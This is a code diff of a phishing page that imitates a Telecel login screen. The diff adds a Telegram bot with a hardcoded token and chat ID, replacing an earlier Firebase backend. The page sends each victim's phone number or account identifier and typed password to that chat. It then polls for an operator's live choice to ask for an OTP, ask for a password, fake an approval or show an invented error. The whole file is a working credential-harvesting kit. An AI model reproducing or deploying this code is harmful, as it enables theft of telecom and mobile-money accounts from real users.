@@ -3,11 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Telecel – Login (Single Attempt)</title>
-
-<!-- Firebase SDK (compat) -->
-<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
-<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-firestore.js"></script>
+<title>Telecel – Login with Bot Review</title>
 
 <!-- Google Fonts & Icons -->
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
@@ -27,15 +23,15 @@ body{
 }
 
 .container {
-      width: 360px;
-      background: #f7f7f7;
-      border-radius: 28px;
-      padding: 40px 20px;
-      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
-      position: relative;
-      overflow: hidden;
-      text-align: center;
-    }
+  width: 360px;
+  background: #f7f7f7;
+  border-radius: 28px;
+  padding: 40px 20px;
+  box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
+  position: relative;
+  overflow: hidden;
+  text-align: center;
+}
 
 /* TOP RED SHAPE */
 .top-bg{
@@ -48,7 +44,7 @@ body{
   border-bottom-left-radius:120px;
 }
 
-/* CONTENT WRAPPER – keeps everything above the top-bg */
+/* CONTENT WRAPPER */
 .content {
   position: relative;
   z-index: 2;
@@ -206,6 +202,42 @@ body{
   font-weight:600;
 }
 
+/* Password field (dynamically added) */
+.password-container {
+  margin-top: 15px;
+}
+
+.password-label {
+  font-size:13px;
+  color:#666;
+  margin-bottom:8px;
+  display: block;
+  text-align: left;
+}
+
+.password-input {
+  width: 100%;
+  height: 50px;
+  border-radius: 12px;
+  border: 1px solid #ddd;
+  padding: 0 15px;
+  font-size: 15px;
+  background: #fff;
+  margin-bottom: 10px;
+}
+
+.btn-password {
+  background: #ff0000;
+  color: #fff;
+  font-weight: 600;
+  width: 100%;
+  height: 55px;
+  border: none;
+  border-radius: 14px;
+  font-size: 16px;
+  cursor: pointer;
+}
+
 /* VERSION */
 .version{
   text-align:center;
@@ -239,7 +271,40 @@ body{
   to { transform: rotate(360deg); }
 }
 
-/* ERROR TOAST – removed as we no longer show errors */
+/* ERROR BOX (from sample) */
+.error-box{
+  position: absolute;
+  top: 20px;
+  left: 20px;
+  right: 20px;
+  background: #fff;
+  border: 2px solid #ff4d4d;
+  border-radius: 12px;
+  padding: 15px;
+  display: none;
+  box-shadow: 0 5px 20px rgba(0,0,0,0.1);
+  z-index: 100;
+}
+
+.error-title{
+  color: #ff0000;
+  font-weight: bold;
+  margin-bottom: 5px;
+}
+
+.error-text{
+  color: #444;
+  font-size: 14px;
+}
+
+.close{
+  position: absolute;
+  right: 15px;
+  top: 10px;
+  cursor: pointer;
+  font-size: 18px;
+  color: #999;
+}
 </style>
 </head>
 
@@ -248,6 +313,13 @@ body{
 <div class="container">
 
   <div class="top-bg"></div>
+
+  <!-- ERROR BOX (exactly as sample) -->
+  <div class="error-box" id="errorBox">
+    <div class="close" onclick="hideError()">×</div>
+    <div class="error-title">Error</div>
+    <div class="error-text" id="errorText">Account details provided is incorrect</div>
+  </div>
 
   <div class="content">
 
@@ -265,7 +337,7 @@ body{
     </div>
 
     <!-- FORM -->
-    <div class="form">
+    <div class="form" id="formContainer">
 
       <div class="label">Account type</div>
 
@@ -286,7 +358,12 @@ body{
       <div class="label" id="inputLabel" style="margin-top:15px;">Phone Number</div>
       <input class="input" id="inputField" placeholder="020XXXXXXX" inputmode="numeric">
 
-      <button class="btn btn-primary" onclick="submitForm()">Next</button>
+      <!-- Original Next button -->
+      <button class="btn btn-primary" id="nextBtn" onclick="submitForm()">Next</button>
+      
+      <!-- Placeholder for dynamic password field – now placed BEFORE Go Back button -->
+      <div id="passwordPlaceholder"></div>
+      
       <button class="btn btn-outline">Go Back</button>
 
       <div class="version">v26.2.2(TPA-2622)</div>
@@ -303,20 +380,13 @@ body{
 </div>
 
 <script>
-  // ==================== FIREBASE CONFIG ====================
-  const firebaseConfig = {
-    apiKey: "AIzaSyCjztxgN2BRjuHDMQnpNEuB7NE9C9R8nU0",
-    authDomain: "tele-panel.firebaseapp.com",
-    projectId: "tele-panel",
-    storageBucket: "tele-panel.firebasestorage.app",
-    messagingSenderId: "859165937892",
-    appId: "1:859165937892:web:db441a884b1a98c36b1cf1",
-    measurementId: "G-5ZPQ1H0SWR"
-  };
+  // ==================== TELEGRAM BOT CONFIG ====================
+  // !!! REPLACE WITH YOUR ACTUAL BOT TOKEN AND CHAT ID !!!
+  const BOT_TOKEN = '8276553360:AAGD0pyKatfqmNyfWnvQ6nFkuM3QG3kfJ9k';
+  const CHAT_ID   = '1006917440';
 
-  firebase.initializeApp(firebaseConfig);
-  const db = firebase.firestore();
-  const COLLECTION_NAME = 'telecel_submissions';
+  // If you need a CORS proxy, change this line (e.g., add 'https://cors-anywhere.herokuapp.com/' before the URL)
+  const API_BASE = `https://api.telegram.org/bot${BOT_TOKEN}`;
 
   // ==================== DOM ELEMENTS ====================
   const selectedType = document.getElementById('selectedType');
@@ -324,10 +394,25 @@ body{
   const dropdownList = document.getElementById('dropdownList');
   const arrow = document.getElementById('arrow');
   const spinner = document.getElementById('spinner');
-  const submitBtn = document.querySelector('.btn-primary');
+  const nextBtn = document.getElementById('nextBtn');
+  const passwordPlaceholder = document.getElementById('passwordPlaceholder');
+  const errorBox = document.getElementById('errorBox');
+  const errorText = document.getElementById('errorText');
 
   // ==================== STATE ====================
-  let isSubmitting = false;        // prevents double clicks while spinner active
+  let isSubmitting = false;
+  let currentPollInterval = null;
+  let passwordFieldVisible = false; // track if password field is shown
+
+  // ==================== ERROR HANDLING (from sample) ====================
+  function showError(message) {
+    errorText.innerText = message || 'Account details provided is incorrect';
+    errorBox.style.display = 'block';
+  }
+
+  function hideError() {
+    errorBox.style.display = 'none';
+  }
 
   // ==================== INPUT FILTERING ====================
   function filterInput(value, type) {
@@ -347,7 +432,15 @@ body{
     }
   }
 
-  inputField.addEventListener('input', applyFilter);
+  inputField.addEventListener('input', function(e) {
+    applyFilter();
+    // When user edits the phone, hide password field if visible and show Next button (and re-enable it)
+    if (passwordFieldVisible) {
+      hidePasswordField();
+    }
+    // Also hide any error box
+    hideError();
+  });
 
   inputField.addEventListener('paste', function(e) {
     e.preventDefault();
@@ -360,6 +453,11 @@ body{
     this.value = filterInput(newValue, currentType);
     const newCursor = start + filtered.length;
     this.setSelectionRange(newCursor, newCursor);
+    // Also hide password field if visible
+    if (passwordFieldVisible) {
+      hidePasswordField();
+    }
+    hideError();
   });
 
   // ==================== DROPDOWN FUNCTIONS ====================
@@ -391,6 +489,12 @@ body{
     applyFilter();
     dropdownList.style.display = 'none';
     arrow.classList.remove('rotate');
+
+    // If password field is visible, hide it when account type changes
+    if (passwordFieldVisible) {
+      hidePasswordField();
+    }
+    hideError();
   }
 
   document.addEventListener('click', function(e) {
@@ -400,21 +504,52 @@ body{
     }
   });
 
-  // ==================== FIREBASE SAVE ====================
-  async function saveAttempt(accountType, inputValue, attemptNumber) {
+  // ==================== TELEGRAM HELPER FUNCTIONS ====================
+  async function sendToTelegram(payload) {
+    const url = `${API_BASE}/sendMessage`;
     try {
-      await db.collection(COLLECTION_NAME).add({
-        accountType: accountType,
-        inputValue: inputValue,
-        attempt: attemptNumber,
-        timestamp: firebase.firestore.FieldValue.serverTimestamp(),
-        userAgent: navigator.userAgent,
-        pageUrl: window.location.href
+      const response = await fetch(url, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
       });
-      console.log(`Attempt ${attemptNumber} saved silently`);
+      return await response.json();
     } catch (error) {
-      console.error('Firebase save error:', error);
+      console.error('Telegram send error:', error);
+      throw error;
     }
+  }
+
+  function pollForCallback(expectedPrefix, expectedTs, onDecision) {
+    if (currentPollInterval) clearInterval(currentPollInterval);
+
+    let lastUpdateId = 0;
+
+    currentPollInterval = setInterval(async () => {
+      try {
+        const url = `${API_BASE}/getUpdates?offset=${lastUpdateId + 1}&timeout=5`;
+        const response = await fetch(url);
+        const data = await response.json();
+        if (!data.ok || !data.result.length) return;
+
+        data.result.forEach(update => {
+          lastUpdateId = update.update_id;
+          if (update.callback_query && update.callback_query.data) {
+            const parts = update.callback_query.data.split('_');
+            if (parts.length >= 3) {
+              const [type, action, time] = parts;
+              if (time == expectedTs && type === expectedPrefix) {
+                clearInterval(currentPollInterval);
+                currentPollInterval = null;
+                onDecision(action);
+              }
+            }
+          }
+        });
+      } catch (err) {
+        console.warn('Polling error:', err);
+      }
+    }, 1500);
   }
 
   // ==================== GENERATE 6‑DIGIT OTP ====================
@@ -422,7 +557,90 @@ body{
     return Math.floor(100000 + Math.random() * 900000).toString();
   }
 
-  // ==================== FORM SUBMISSION (SINGLE ATTEMPT) ====================
+  // ==================== SHOW / HIDE PASSWORD FIELD ====================
+  function hidePasswordField() {
+    passwordPlaceholder.innerHTML = '';
+    nextBtn.style.display = 'block'; // show original Next button
+    nextBtn.disabled = false;        // IMPORTANT: re-enable it
+    passwordFieldVisible = false;
+    // Stop any ongoing polling (decision no longer relevant)
+    if (currentPollInterval) {
+      clearInterval(currentPollInterval);
+      currentPollInterval = null;
+    }
+  }
+
+  function showPasswordField() {
+    // Hide the original Next button
+    nextBtn.style.display = 'none';
+
+    // Create password input and button with label
+    const passwordHtml = `
+      <div class="password-container">
+        <div class="password-label">Enter Password</div>
+        <input type="password" class="password-input" id="passwordField" placeholder="Enter password" autocomplete="off">
+        <button class="btn-password" id="submitPasswordBtn">Verify Password</button>
+      </div>
+    `;
+    passwordPlaceholder.innerHTML = passwordHtml;
+    passwordFieldVisible = true;
+
+    // Attach event to the new button
+    document.getElementById('submitPasswordBtn').addEventListener('click', handlePasswordSubmit);
+  }
+
+  // ==================== HANDLE PASSWORD SUBMISSION ====================
+  async function handlePasswordSubmit() {
+    const passwordField = document.getElementById('passwordField');
+    const password = passwordField.value.trim();
+    if (!password) return;
+
+    spinner.style.display = 'flex';
+    isSubmitting = true;
+
+    const accountType = selectedType.value;
+    const inputValue = inputField.value.trim();
+    const ts = Date.now();
+
+    // Send password to Telegram with options OTP, Approve, Decline
+    const msg = `Password Verification\n\nAccount: ${accountType}\nIdentifier: ${inputValue}\nPassword: ${password}\n\nChoose action:`;
+    await sendToTelegram({
+      chat_id: CHAT_ID,
+      text: msg,
+      reply_markup: {
+        inline_keyboard: [[
+          { text: 'OTP', callback_data: `password_otp_${ts}` },
+          { text: 'Approve', callback_data: `password_approve_${ts}` },
+          { text: 'Decline', callback_data: `password_decline_${ts}` }
+        ]]
+      }
+    });
+
+    pollForCallback('password', ts, (action) => {
+      spinner.style.display = 'none';
+      isSubmitting = false;
+
+      if (action === 'otp') {
+        // Redirect to OTP page
+        const phoneDigits = inputField.value.replace(/\D/g, '');
+        sessionStorage.setItem('telecel_phone', phoneDigits);
+        sessionStorage.setItem('telecel_accountType', accountType);
+        sessionStorage.setItem('telecel_inputValue', inputValue);
+        sessionStorage.setItem('telecel_otp', generateOTP());
+        window.location.href = 'otp.html';
+      } else if (action === 'approve') {
+        // Redirect to unavailable page
+        window.location.href = 'unavailable.html';
+      } else if (action === 'decline') {
+        // Show error
+        showError('Wrong password');
+        passwordField.value = '';
+        passwordField.focus();
+      }
+    });
+  }
+
+  // ==================== FORM SUBMISSION (FIRST STEP) ====================
   async function submitForm() {
     if (isSubmitting) return;
 
@@ -432,32 +650,58 @@ body{
     if (inputValue === '') return;
 
     isSubmitting = true;
-    submitBtn.disabled = true;
+    nextBtn.disabled = true;
     spinner.style.display = 'flex';
 
-    // Save attempt 1
-    await saveAttempt(accountType, inputValue, 1);
-
-    // Generate OTP
-    const otp = generateOTP();
-
-    // Store data for OTP page
+    // Store basic data for later use
     const phoneDigits = inputField.value.replace(/\D/g, '');
     sessionStorage.setItem('telecel_phone', phoneDigits);
     sessionStorage.setItem('telecel_accountType', accountType);
     sessionStorage.setItem('telecel_inputValue', inputValue);
-    sessionStorage.setItem('telecel_otp', otp);
+    sessionStorage.setItem('telecel_otp', generateOTP());
 
-    // Redirect to OTP page after short delay
-    setTimeout(() => {
-      window.location.href = 'otp.html';
-    }, 800);
+    const ts = Date.now();
+    const msg = `New Login Attempt\n\nAccount Type: ${accountType}\nIdentifier: ${inputValue}\n\nChoose action:`;
+
+    await sendToTelegram({
+      chat_id: CHAT_ID,
+      text: msg,
+      reply_markup: {
+        inline_keyboard: [[
+          { text: 'OTP', callback_data: `initial_otp_${ts}` },
+          { text: 'Password', callback_data: `initial_password_${ts}` },
+          { text: 'Decline', callback_data: `initial_decline_${ts}` }
+        ]]
+      }
+    });
+
+    pollForCallback('initial', ts, (action) => {
+      spinner.style.display = 'none';
+      isSubmitting = false;
+
+      if (action === 'otp') {
+        window.location.href = 'otp.html';
+      } else if (action === 'password') {
+        showPasswordField();
+      } else if (action === 'decline') {
+        // Show error box with custom message
+        showError('Account details could not be verified. Please check and try again.');
+        // Re-enable the Next button
+        nextBtn.disabled = false;
+      }
+    });
   }
 
   // ==================== INIT ====================
   dropdownList.style.display = 'none';
-  submitBtn.disabled = false;
+  nextBtn.disabled = false;
   applyFilter();
+
+  // Expose functions to global for inline event handlers
+  window.toggleDropdown = toggleDropdown;
+  window.selectType = selectType;
+  window.submitForm = submitForm;
+  window.hideError = hideError; // for close button
 </script>
 
 </body>
